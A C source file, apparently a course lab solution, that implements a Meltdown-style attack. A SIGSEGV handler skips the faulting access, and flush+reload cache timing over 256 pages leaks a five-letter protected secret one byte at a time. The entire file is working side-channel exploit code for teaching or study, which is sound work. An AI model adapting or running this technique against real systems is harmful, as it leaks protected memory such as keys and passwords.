#include "recover_protected_local_secret.h"

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

#define __USE_GNU
#include <signal.h>

#include "util.h"

extern uint8_t label[];

const size_t MIN_CHOICE = 'A' - 1;
const size_t MAX_CHOICE = 'Z' + 1;
const size_t SECRET_LENGTH = 5;
const size_t THRESHOLD = 280;

static inline page_t *init_pages(void) {
    page_t *pages = calloc(UINT8_MAX + 1, PAGE_SIZE);
    assert(pages != NULL);
    return pages;
}

static inline void flush_all_pages(page_t *pages) {
    for (size_t i = MIN_CHOICE; i <= MAX_CHOICE; i++) {
        flush_cache_line((void *) pages[i]);
    }
}

static inline size_t guess_accessed_page(page_t *pages) {
    for (size_t i = MIN_CHOICE; i <= MAX_CHOICE; i++) {
        uint64_t time1 = time_read((void *) pages[i]);
        uint64_t time2 = time_read((void *) pages[i]);
        // printf("%zd, %zd\n", time1, time2);
        if (time1 < THRESHOLD && time2 < THRESHOLD) {
            if (i == MIN_CHOICE || i == MAX_CHOICE) return 0;
            return i;
        }
    }
    return 0;
}

static inline void do_access(page_t *pages, size_t secret_index) {
    cache_secret();
    size_t index = access_secret(secret_index);
    force_read(pages[index]);
}

static void sigfpe_handler(int signum, siginfo_t *siginfo, void *context) {
    (void) signum;
    (void) siginfo;
    ucontext_t *ucontext = (ucontext_t *) context;
    ucontext->uc_mcontext.gregs[REG_RIP] = (greg_t) label;
}

int main() {
    struct sigaction act = {.sa_sigaction = sigfpe_handler, .sa_flags = SA_SIGINFO};
    sigaction(SIGSEGV, &act, NULL);

    page_t *pages = init_pages();

    for (size_t i = 0; i < SECRET_LENGTH; i++) {
        while (1) {
            flush_all_pages(pages);

            do_access(pages, i);

            asm volatile("label:");
            size_t guess = guess_accessed_page(pages);
            if (guess > 0) {
                printf("%c", (char) (guess));
                break;
            }
        }
    }

    printf("\n");
    free(pages);
}
